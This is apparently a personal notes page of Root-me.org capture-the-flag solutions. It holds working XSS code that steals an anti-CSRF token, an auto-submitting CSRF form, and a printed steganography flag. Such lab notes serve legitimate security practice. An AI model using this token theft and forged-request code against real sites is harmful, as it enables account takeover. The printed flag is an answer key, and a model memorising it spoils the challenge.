---
description: 'Goal is simple : Solve all the challs.'
---

# Root-me.org

I decided to start getting habit of taking note after this tragedy happens \(Thanks @reznok!!!!\)

Again, this is a note so that incase root-me be fucked up again, i can easily got all my flag and solution back, **THIS IS NOT A WRITE UP**.

![sad.png](.gitbook/assets/image%20%284%29.png)

## Web - Client

###  CSRF - token bypass

 First, we must steal the token by using XSS

{% code-tabs %}
{% code-tabs-item title="steal\_token.js" %}
```javascript
<iframe id="iframe" src="/web-client/ch23/?action=profile" onload="read()"></iframe>
<script>
function read()
{
 document.location = document.getElementById("iframe").contentDocument.forms[0].token.value;
}
</script>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Second, we create crsf form that get token and submit request

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>
function get(name){
   if(name=(new RegExp('[?&]'+encodeURIComponent(name)+'=([^&]*)')).exec(location.search))
      document.getElementById("token").value = decodeURIComponent(name[1]);
}
</script>

    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="tuanlinh1" />
      <input type="hidden" name="status" value="on" />
      <input id="token" name="token" value="" />
      <input type="submit" value="Submit request" />
      <script>get('token')</script>
      <script>document.getElementById("csrf").submit()</script>
    </form>

  </body>
</html>

```

![pow](.gitbook/assets/image%20%2873%29.png)

## Steganography

### Some Noise

Reverse it + Slow it down using Audacity

{% file src=".gitbook/assets/out\_flag.mp3" %}

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text
3b27641fc5h0
```
{% endcode-tabs-item %}
{% endcode-tabs %}

